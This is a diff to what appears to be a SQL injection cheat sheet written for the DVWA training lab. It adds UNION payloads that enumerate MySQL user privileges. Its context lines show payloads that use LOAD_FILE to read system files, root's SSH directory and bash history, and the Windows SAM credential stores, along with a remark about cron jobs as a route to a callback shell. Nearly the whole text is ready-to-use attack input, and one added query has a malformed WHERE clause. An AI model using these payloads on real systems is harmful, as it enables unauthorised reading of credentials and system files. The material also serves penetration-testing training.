@@ -7,9 +7,21 @@ Search Tag: #sql-injection #union #enumeration-and-discovery #dvwa
 1. The DB user must have **FILE** and **SELECT** privileges.
 2. **Note:** Not all files are readable unless the current user is `root@<IP>` (e.g. `root@localhost`). You'll notice that you can't fetch SSH credentials which is normal due to security reasons.
 
-## 3.2 - Basic Information
+## 3.2 - Enumerate Database User Privileges
 
-### 3.1.1 - Linux
+```sql
+' UNION SELECT NULL, GROUP_CONCAT(user, '->', 'FILE', '->', File_priv) FROM mysql.user#
+
+' UNION SELECT NULL, GROUP_CONCAT(user, '->', 'FILE', '->', File_priv) FROM mysql.user WHERE File_priv = 'Y' AND user = 'dvwa'#
+
+' UNION SELECT NULL, GROUP_CONCAT(PRIVILEGE_TYPE, '->', GRANTEE, '->', IS_GRANTABLE, '<br>') FROM information_schema.USER_PRIVILEGES#
+
+' UNION SELECT NULL, GROUP_CONCAT(PRIVILEGE_TYPE, '->', GRANTEE, '->', IS_GRANTABLE, '<br>') FROM information_schema.USER_PRIVILEGES WHERE PRIVILEGE_TYPE LIKE 'SELECT' OR PRIVILEGE_TYPE OR 'FILE' AND GRANTEE LIKE "'dvwa'%"#
+```
+
+## 3.3 - Basic Information
+
+### 3.3.1 - Linux
 
 - Enumerate hostname
 
@@ -81,7 +93,7 @@ Search Tag: #sql-injection #union #enumeration-and-discovery #dvwa
 ' UNION SELECT NULL, LOAD_FILE('/proc/version')#
 ```
 
-### 3.1.2 - Windows
+### 3.3.2 - Windows
 
 ```sql
 ' UNION SELECT NULL, LOAD_FILE('c:/windows/win.ini')#
@@ -95,9 +107,9 @@ Search Tag: #sql-injection #union #enumeration-and-discovery #dvwa
 ' UNION SELECT NULL, LOAD_FILE('c:/Windows/system32/drivers/etc/hosts')#
 ```
 
-## 3.3 - Credentials
+## 3.4 - Credentials
 
-### 3.3.1 - Linux
+### 3.4.1 - Linux
 
 - Retrieve SSH keys
 
@@ -121,7 +133,7 @@ Search Tag: #sql-injection #union #enumeration-and-discovery #dvwa
 ' UNION SELECT NULL, LOAD_FILE('/root/.ssh/.bash_history')#
 ```
 
-### 3.3.2 - Windows
+### 3.4.2 - Windows
 
 ```sql
 ' UNION SELECT NULL, LOAD_FILE('C:/Windows/Repair/SAM')#
@@ -135,9 +147,9 @@ Search Tag: #sql-injection #union #enumeration-and-discovery #dvwa
 ' UNION SELECT NULL, LOAD_FILE('C:/Windows/System32/config/sam')#
 ```
 
-## 3.4 - Privilege Escalation
+## 3.5 - Privilege Escalation
 
-### 3.4.1 - Linux
+### 3.5.1 - Linux
 
 - CronJobs may contain backup files that is worth **harvesting the data**. Moreover, there is a possible attack vector to spawn a callback shell. Be on the lookout.
 
